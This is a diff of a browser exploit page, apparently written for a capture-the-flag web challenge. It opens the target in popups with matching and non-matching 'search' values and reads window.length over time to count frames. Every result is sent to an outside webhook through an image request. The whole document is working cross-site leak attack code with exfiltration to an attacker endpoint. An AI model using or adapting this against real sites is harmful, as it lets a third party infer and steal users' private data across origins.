@@ -10,141 +10,131 @@ function ping(m) { new Image().src = WH + '?' + encodeURIComponent(m); }
 function log(m) { document.getElementById('log').textContent += m + '\n'; }
 function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
 
-function testPopup(url, timeout) {
-  timeout = timeout || 4000;
+// Track popup.length over time (every intervalMs for durationMs)
+function trackPopup(url, durationMs, intervalMs) {
   return new Promise(function(resolve) {
-    var start = performance.now();
     var w;
     try { w = window.open(url); } catch(e) {
-      resolve({ w: null, t: -1, len: -1, err: 'err:' + e.message }); return;
+      resolve({ history: [-1], err: e.message }); return;
     }
-    if (!w) { resolve({ w: null, t: -1, len: -2, err: 'blocked' }); return; }
+    if (!w) { resolve({ history: [-2], err: 'blocked' }); return; }
+
+    var history = [];
+    var start = performance.now();
     var iv = setInterval(function() {
       var len = -1;
       try { len = w.length; } catch(e) {}
-      if (len > 0 || performance.now() - start > timeout) {
+      history.push(len);
+      if (performance.now() - start >= durationMs) {
         clearInterval(iv);
-        resolve({ w: w, t: performance.now() - start, len: len });
+        w.close();
+        resolve({ history: history });
       }
-    }, 10);
+    }, intervalMs);
   });
 }
 
-function testIframe(url, delay) {
-  delay = delay || 3000;
+// Open popup, wait delayMs, read length, close
+function delayedPopup(url, delayMs) {
   return new Promise(function(resolve) {
-    var f = document.createElement('iframe');
-    f.style.cssText = 'width:400px;height:400px;position:absolute;left:-9999px';
-    var start = performance.now();
-    var done = false;
-    f.onload = function() {
-      var lt = performance.now() - start;
-      setTimeout(function() {
-        if (done) return; done = true;
-        var len = -1;
-        try { len = f.contentWindow.length; } catch(e) {}
-        resolve({ f: f, t: lt, len: len });
-      }, delay);
-    };
-    f.src = url;
-    document.body.appendChild(f);
+    var w;
+    try { w = window.open(url); } catch(e) {
+      resolve({ len: -1 }); return;
+    }
+    if (!w) { resolve({ len: -2 }); return; }
     setTimeout(function() {
-      if (done) return; done = true;
       var len = -1;
-      try { len = f.contentWindow.length; } catch(e) {}
-      resolve({ f: f, t: 9999, len: len });
-    }, delay + 4000);
+      try { len = w.length; } catch(e) {}
+      w.close();
+      resolve({ len: len });
+    }, delayMs);
   });
 }
 
 async function run() {
-  ping('v10_start');
+  ping('v11_start');
   var mUrl = CHALL + '/?referrerPolicy=no-referrer';
   var nmUrl = CHALL + '/?referrerPolicy=no-referrer&search=zzzzzzz';
 
-  // T1: iframe + 3s delay (storage partitioning check)
-  var t1m = await testIframe(mUrl, 3000);
-  ping('t1m=' + t1m.len + '_' + Math.round(t1m.t));
-  t1m.f.remove();
-  var t1nm = await testIframe(nmUrl, 3000);
-  ping('t1nm=' + t1nm.len + '_' + Math.round(t1nm.t));
-  t1nm.f.remove();
+  // === T1: Track popup.length every 100ms for 3s - MATCH ===
+  log('T1: track match');
+  var t1 = await trackPopup(mUrl, 3000, 100);
+  ping('t1=' + t1.history.join(','));
+  await sleep(300);
 
-  // T2: popup basic match vs nomatch
-  var t2m = await testPopup(mUrl);
-  ping('t2m=' + t2m.len + '_' + Math.round(t2m.t) + (t2m.err ? '_' + t2m.err : ''));
-  if (t2m.w) t2m.w.close(); await sleep(200);
-  var t2nm = await testPopup(nmUrl);
-  ping('t2nm=' + t2nm.len + '_' + Math.round(t2nm.t) + (t2nm.err ? '_' + t2nm.err : ''));
-  if (t2nm.w) t2nm.w.close(); await sleep(200);
+  // === T2: Track popup.length every 100ms for 3s - NOMATCH ===
+  log('T2: track nomatch');
+  var t2 = await trackPopup(nmUrl, 3000, 100);
+  ping('t2=' + t2.history.join(','));
+  await sleep(300);
 
-  // T3: popup + loading=lazy on ads
-  var t3m = await testPopup(CHALL + '/?loading=x&referrerPolicy=lazy');
-  ping('t3m=' + t3m.len + '_' + Math.round(t3m.t));
-  if (t3m.w) t3m.w.close(); await sleep(200);
-  var t3nm = await testPopup(CHALL + '/?loading=x&referrerPolicy=lazy&search=zzzzzzz');
-  ping('t3nm=' + t3nm.len + '_' + Math.round(t3nm.t));
-  if (t3nm.w) t3nm.w.close(); await sleep(200);
+  // === T3: Track hidden match (id=hash-ad-frame) ===
+  log('T3: track hidden match');
+  var t3 = await trackPopup(CHALL + '/?id=x&referrerPolicy=hash-ad-frame', 3000, 100);
+  ping('t3=' + t3.history.join(','));
+  await sleep(300);
 
-  // T4: popup + id=hash-ad-frame (ads hidden via CSS)
-  var t4m = await testPopup(CHALL + '/?id=x&referrerPolicy=hash-ad-frame');
-  ping('t4m=' + t4m.len + '_' + Math.round(t4m.t));
-  if (t4m.w) t4m.w.close(); await sleep(200);
-  var t4nm = await testPopup(CHALL + '/?id=x&referrerPolicy=hash-ad-frame&search=zzzzzzz');
-  ping('t4nm=' + t4nm.len + '_' + Math.round(t4nm.t));
-  if (t4nm.w) t4nm.w.close(); await sleep(200);
+  // === T4: Track hidden nomatch ===
+  log('T4: track hidden nomatch');
+  var t4 = await trackPopup(CHALL + '/?id=x&referrerPolicy=hash-ad-frame&search=zzzzzzz', 3000, 100);
+  ping('t4=' + t4.history.join(','));
+  await sleep(300);
 
-  // T5: popup + srcdoc override (eliminates ad network requests)
-  var t5m = await testPopup(CHALL + '/?srcdoc=x&referrerPolicy=x');
-  ping('t5m=' + t5m.len + '_' + Math.round(t5m.t));
-  if (t5m.w) t5m.w.close(); await sleep(200);
-  var t5nm = await testPopup(CHALL + '/?srcdoc=x&referrerPolicy=x&search=zzzzzzz');
-  ping('t5nm=' + t5nm.len + '_' + Math.round(t5nm.t));
-  if (t5nm.w) t5nm.w.close(); await sleep(200);
-
-  // T6: popup timing x5 alternating match/nomatch
-  var mt = [], nmt = [], ml = [], nml = [];
+  // === T5: Delayed 2s checks - basic (5x match, 5x nomatch) ===
+  log('T5: delayed basic');
+  var m5 = [], nm5 = [];
   for (var i = 0; i < 5; i++) {
-    var a = await testPopup(mUrl);
-    mt.push(Math.round(a.t)); ml.push(a.len);
-    if (a.w) a.w.close(); await sleep(100);
-    var b = await testPopup(nmUrl);
-    nmt.push(Math.round(b.t)); nml.push(b.len);
-    if (b.w) b.w.close(); await sleep(100);
+    var r1 = await delayedPopup(mUrl, 2000);
+    m5.push(r1.len);
+    await sleep(100);
+    var r2 = await delayedPopup(nmUrl, 2000);
+    nm5.push(r2.len);
+    await sleep(100);
   }
-  ping('t6mt=' + mt.join(',') + '_nmt=' + nmt.join(','));
-  ping('t6ml=' + ml.join(',') + '_nml=' + nml.join(','));
+  ping('t5m=' + m5.join(',') + '_nm=' + nm5.join(','));
 
-  // T7: popup + lazy timing x3
-  var lmt = [], lnmt = [], lml = [], lnml = [];
-  for (var i = 0; i < 3; i++) {
-    var c = await testPopup(CHALL + '/?loading=x&referrerPolicy=lazy');
-    lmt.push(Math.round(c.t)); lml.push(c.len);
-    if (c.w) c.w.close(); await sleep(100);
-    var d = await testPopup(CHALL + '/?loading=x&referrerPolicy=lazy&search=zzzzzzz');
-    lnmt.push(Math.round(d.t)); lnml.push(d.len);
-    if (d.w) d.w.close(); await sleep(100);
+  // === T6: Delayed 2s checks - hidden (5x) ===
+  log('T6: delayed hidden');
+  var m6 = [], nm6 = [];
+  for (var i = 0; i < 5; i++) {
+    var r3 = await delayedPopup(CHALL + '/?id=x&referrerPolicy=hash-ad-frame', 2000);
+    m6.push(r3.len);
+    await sleep(100);
+    var r4 = await delayedPopup(CHALL + '/?id=x&referrerPolicy=hash-ad-frame&search=zzzzzzz', 2000);
+    nm6.push(r4.len);
+    await sleep(100);
   }
-  ping('t7lmt=' + lmt.join(',') + '_lnmt=' + lnmt.join(','));
-  ping('t7lml=' + lml.join(',') + '_lnml=' + lnml.join(','));
+  ping('t6m=' + m6.join(',') + '_nm=' + nm6.join(','));
 
-  // T8: popup + hidden(id) timing x3
-  var hmt = [], hnmt = [], hml = [], hnml = [];
-  for (var i = 0; i < 3; i++) {
-    var e = await testPopup(CHALL + '/?id=x&referrerPolicy=hash-ad-frame');
-    hmt.push(Math.round(e.t)); hml.push(e.len);
-    if (e.w) e.w.close(); await sleep(100);
-    var g = await testPopup(CHALL + '/?id=x&referrerPolicy=hash-ad-frame&search=zzzzzzz');
-    hnmt.push(Math.round(g.t)); hnml.push(g.len);
-    if (g.w) g.w.close(); await sleep(100);
+  // === T7: Delayed 2s checks - lazy (5x) ===
+  log('T7: delayed lazy');
+  var m7 = [], nm7 = [];
+  for (var i = 0; i < 5; i++) {
+    var r5 = await delayedPopup(CHALL + '/?loading=x&referrerPolicy=lazy', 2000);
+    m7.push(r5.len);
+    await sleep(100);
+    var r6 = await delayedPopup(CHALL + '/?loading=x&referrerPolicy=lazy&search=zzzzzzz', 2000);
+    nm7.push(r6.len);
+    await sleep(100);
   }
-  ping('t8hmt=' + hmt.join(',') + '_hnmt=' + hnmt.join(','));
-  ping('t8hml=' + hml.join(',') + '_hnml=' + hnml.join(','));
+  ping('t7m=' + m7.join(',') + '_nm=' + nm7.join(','));
 
-  ping('v10_done');
+  // === T8: Delayed 2s checks - srcdoc override (5x) ===
+  log('T8: delayed srcdoc');
+  var m8 = [], nm8 = [];
+  for (var i = 0; i < 5; i++) {
+    var r7 = await delayedPopup(CHALL + '/?srcdoc=x&referrerPolicy=x', 2000);
+    m8.push(r7.len);
+    await sleep(100);
+    var r8 = await delayedPopup(CHALL + '/?srcdoc=x&referrerPolicy=x&search=zzzzzzz', 2000);
+    nm8.push(r8.len);
+    await sleep(100);
+  }
+  ping('t8m=' + m8.join(',') + '_nm=' + nm8.join(','));
+
+  ping('v11_done');
   log('Done!');
 }
-
 run();
 </script>
 </body>
